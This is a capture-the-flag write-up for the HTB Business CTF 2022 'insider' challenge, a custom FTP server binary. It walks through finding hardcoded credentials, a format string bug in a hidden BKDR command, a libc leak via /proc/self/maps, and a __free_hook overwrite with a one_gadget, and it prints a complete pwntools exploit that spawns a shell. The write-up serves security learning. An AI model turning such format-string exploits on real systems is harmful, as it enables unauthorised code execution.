+++
tags = ["format string","ctf","linux"]
categories = ["Capture the Flag", "Binary Exploitation"]
date = "2022-07-17"
description = "A writeup for the binary exploitation challenge 'insider' from HTB Business CTF 2022."
featuredpath = "date"
linktitle = ""
title = "HTB Business CTF 2022 :: Insider"
slug = "htbbizctf-2022-insider"
type = "post"
+++

## Reverse Engineering

We'll start by running `file` to get an idea of the executable's architecture and platform. Note that it is a 64-bit linux executable.

```
$ file ./chall
./chall: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8bdf868a7d36a356638d98d3299887ae81995e2e, stripped
```

Running pwntools' `checksec` tool reveals that there is no stack canary in place - so if we found a buffer overflow present in the binary it'd be trivial to exploit. All other protections are in place so we'll likely need to leak a libc address in order to progress further.

```
$ checksec ./chall
[*] './chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./'
```

When we run the binary, it appears to be a custom implementation of an FTP server. Inputting common commands tells us that we need to find a way to either provide valid credentials, or bypass the login functionality.
```
$ ./chall
220 Blablah FTP
USER asdf
530 Cannot find user name. Do you belong here. 
PASS asdf
530 Need login. Login first. 
RETR asdf
530 Need login. Login first. 
```

Viewing the disassembly we can find the control-flow logic for the 'USER' command. Interestingly, it provides two possible paths to sign in. In the first path it calls some function on the input username in order to validate the login. In the second path it calls `getspnam` to check for a valid username.

![](/img/htbbizctf-2022-insider-1.png)

Taking a look at that first mysterious function shows that it's just a wrapper for `strcmp`. Let's spin up GDB and find out what it's comparing our input to. We can just place a breakpoint just before the `strcmp` call.
```
$ gdb ./chall
...
pwndbg> b *(0x555555554000 + 0x00002a3f)
Breakpoint 2 at 0x555555556a3f
pwndbg> r
Starting program: ./chall 
220 Blablah FTP 
USER AAAA

Breakpoint 2, 0x0000555555556a3f in ?? ()
...
 ► 0x555555556a3f    call   strcmp@plt                <strcmp@plt>
        s1: 0x55555555a225 ◂— 0x41414141 /* 'AAAA' */
        s2: 0x5555555580a0 ◂— 0x6c4220642500293b /* ';)' */
```

It's plain to see that the program considers the input `;)` to be a valid username for authentication purposes. Giving this as input confirms this theory.
```
$ ./chall
220 Blablah FTP
USER ;)
331 User name okay need password
```

Repeating the above steps for the 'PASS' command gives us the same result. So we now have valid credentials for the target application.

![](/img/htbbizctf-2022-insider-2.png)

```
 ► 0x555555556a3f    call   strcmp@plt                <strcmp@plt>
        s1: 0x55555555a225 ◂— 'PASSWORD'
        s2: 0x5555555580a0 ◂— 0x6c4220642500293b /* ';)' */
```

```
$./chall
USER ;)
331 User name okay need password 
PASS ;)
230 User logged in proceed 
```

Finally, we want to see what commands are available to us. Looking at the strings in our disassembler gives us this information.
```
   0x4008 USER
   0x400d PASS
   0x4012 RETR
   0x4017 STOR
   0x401c STOU
   0x4021 APPE
   0x4026 REST
   0x402b RNFR
   0x4030 RNTO
   0x4035 ABOR
   0x403a DELE
   0x404f CDUP
   0x4054 LIST
   0x4059 NLST
   0x405e SITE
   0x4063 STAT
   0x4068 HELP
   0x406d NOOP
   0x4072 TYPE
   0x4077 PASV
   0x407c PORT
   0x4081 SYST
   0x4086 QUIT
   0x408b MDTM
   0x4090 SIZE
```


## Finding the Vulnerability

First thing I attempted was to actually just read the contents of `flag.txt` via the 'RETR' command. Sadly our user did not have permission to read the file. Though we do have a file read - maybe we can utilise that for something interesting (more on this later). 
```
$ ./chall 
220 Blablah FTP 
USER ;)
331 User name okay need password 
PASS ;)
230 User logged in proceed 
RETR /flag.txt
500 FTP error: access denyed. Check Permission
RETR /etc/passwd
<censored>
226 Transfer completed
```

After a little more exploration, finding the actual vulnerability present in the executable was remarkably easy. Just by providing various inputs (long strings, format strings, etc) to the different commands - I found a format string vulnerability in the 'BKDR' command.
```
$ ./chall
220 Blablah FTP 
USER ;) 
331 User name okay need password 
PASS ;)
230 User logged in proceed 
BKDR %p %p %p
431136 BKDR 0x3 0xa0d (nil)
```

Great, now we have an arbitrary write via the format string vulnerability we found. We only need two more things in order to build an exploit:
 * A libc address leak (to get symbol locations).
 * Something to overwrite (that'll give us code execution).

We could use this format string we found to leak an address in lib, but that would be boring. Instead, we can use the 'RETR' command to leak the entirety of the process map! That's definitely a fun way to leak process addresses. 
```
$ ./chall
220 Blablah FTP 
USER ;) 
331 User name okay need password 
PASS ;)
230 User logged in proceed 
RETR /proc/self/maps
5561bab83000-5561bab85000 r--p 00000000 fd:00 14944798                   ./chall
5561bab85000-5561bab87000 r-xp 00002000 fd:00 14944798                   ./chall
5561bab87000-5561bab88000 r--p 00004000 fd:00 14944798                   ./chall
5561bab88000-5561bab89000 r--p 00004000 fd:00 14944798                   ./chall
5561bab89000-5561bab8a000 rw-p 00005000 fd:00 14944798                   ./chall
5561bab8a000-5561bab8b000 rw-p 00000000 00:00 0 
5561bab8b000-5561bab8e000 rw-p 00006000 fd:00 14944798                   ./chall
5561bcaa9000-5561bcaca000 rw-p 00000000 00:00 0                          [heap]
7f9b53c03000-7f9b53c05000 rw-p 00000000 00:00 0 
7f9b53c05000-7f9b53c2b000 r--p 00000000 fd:00 14944691                   ./libc.so.6
7f9b53c2b000-7f9b53d96000 r-xp 00026000 fd:00 14944691                   ./libc.so.6
7f9b53d96000-7f9b53de2000 r--p 00191000 fd:00 14944691                   ./libc.so.6
7f9b53de2000-7f9b53de5000 r--p 001dc000 fd:00 14944691                   ./libc.so.6
7f9b53de5000-7f9b53de8000 rw-p 001df000 fd:00 14944691                   ./libc.so.6
7f9b53de8000-7f9b53df3000 rw-p 00000000 00:00 0 
7f9b53df3000-7f9b53df4000 r--p 00000000 fd:00 14944690                   ./ld-linux-x86-64.so.2
7f9b53df4000-7f9b53e1c000 r-xp 00001000 fd:00 14944690                   ./ld-linux-x86-64.so.2
7f9b53e1c000-7f9b53e26000 r--p 00029000 fd:00 14944690                   ./ld-linux-x86-64.so.2
7f9b53e26000-7f9b53e28000 r--p 00032000 fd:00 14944690                   ./ld-linux-x86-64.so.2
7f9b53e28000-7f9b53e2a000 rw-p 00034000 fd:00 14944690                   ./ld-linux-x86-64.so.2
7ffcda8c6000-7ffcda8e7000 rw-p 00000000 00:00 0                          [stack]
7ffcda994000-7ffcda997000 r--p 00000000 00:00 0                          [vvar]
7ffcda997000-7ffcda998000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
226 Transfer completed 
```


## Information Gathering

Now that we've found everything we need, we can do a little more information gathering to get the last thing we need for our exploit - the offset within the format string to the input we control on the stack (needed for our arbitrary write). Let's write a quick script to do just that.

```py
#!/usr/bin/env python3

from pwn import *


r = process('./chall')

# sign in with valid credentials
r.writelineafter('220 Blablah FTP', b'user ;)')
r.writelineafter('331 User name okay need password', b'pass ;)')

for i in range(2000):
    r.writeline(f'bkdr AAAAAAAA %{i}$p')
    r.readuntil('bkdr AAAAAAAA')
    out = r.readline()
    if b'4141' in out:
        print(i, out)

r.close()
```

Running our script, we find that the address we control is located at an offset of 1031.
```
[+] Starting local process './chall': pid 47092
1031 b' 0x4141414141414141 \r\n
[*] Stopped process './chall' (pid 47092)
```


## Exploit Development

Now that we have everything we need, we can begin to write our exploit. There's a few things that we need to achieve, here's a list:
 - Sign into the program using the credentials we found.
 - Leak a libc address via the arbitrary file read.
 - Overwrite some address in order to achieve code execution.

Below are the code snippets for both signing in with the credentials we found, and for leaking a libc address. 

```py
# sign in with valid credentials
r.writelineafter('220 Blablah FTP', b'user ;)')
r.writelineafter('331 User name okay need password', b'pass ;)')
```

```py
# leak addresses
r.writelineafter('230 User logged in proceed', b'RETR /proc/self/maps')
leak = r.readuntil('226 Transfer completed')
libc_base = int(leak.decode('latin').split('\n')[10].split('-')[0], 16)
log.info(f'libc_base = {hex(libc_base)}')

# set up libc elf
libc = ELF('./libc.so.6')
libc.address = libc_base
```

So, one more question remains - how do we utilise our arbitrary write primitive in order to achieve code execution? Well, at the end of the programs input routine a call to `free` is made. If we write an address to `__free_hook` within libc we will be able to redirect program execution.

![](/img/htbbizctf-2022-insider-3.png)

The simplest way to get a shell from this is to use a 'magic' gadget.
```
$ one_gadget libc.so.6 
0xde78c execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xde78f execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xde792 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

The code snippet below overwrites `__free_hook` with our 'magic' gadget, giving us a shell when the call to `free` is made.
```py
# arbitrary write
'''
0xde78f execve("/bin/sh", r15, rdx)
constraints:
      [r15] == NULL || r15 == NULL
      [rdx] == NULL || rdx == NULL
'''
writes = {
    libc.sym.__free_hook: libc.address + 0xde78f
}

# perform format string attack
payload = fmtstr_payload(1031, writes, numbwritten=12)
r.writeline(b'bkdr ' + payload)
``` 

Putting all these pieces together we get the following exploit.
```py
#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'


r = process('./chall')

# sign in with valid credentials
r.writelineafter('220 Blablah FTP', b'user ;)')
r.writelineafter('331 User name okay need password', b'pass ;)')

# leak addresses
r.writelineafter('230 User logged in proceed', b'RETR /proc/self/maps')
leak = r.readuntil('226 Transfer completed')
libc_base = int(leak.decode('latin').split('\n')[10].split('-')[0], 16)
log.info(f'libc_base = {hex(libc_base)}')

# set up libc elf
libc = ELF('./libc.so.6')
libc.address = libc_base

# arbitrary write
'''
0xde78f execve("/bin/sh", r15, rdx)
constraints:
      [r15] == NULL || r15 == NULL
      [rdx] == NULL || rdx == NULL
'''
writes = {
    libc.sym.__free_hook: libc.address + 0xde78f
}

# perform format string attack
payload = fmtstr_payload(1031, writes, numbwritten=12)
r.writeline(b'bkdr ' + payload)

r.clean()
r.interactive()
```

And finally, here's our exploit in action. It gives us an interactive shell that we can use to read the flag. In the actual challenge `/flag.txt` was not readable (as we discovered when we attempted to read it earlier). However, an SUID binary `get_flag` was present on the container, which read the flag for us.
```
$ ./solve.py
[*] libc_base = 0x7ff0d87a1000
[*] './libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
$ ls
chall  flag.txt  get_flag  ld-linux-x86-64.so.2  libc.so.6  solve.py
```

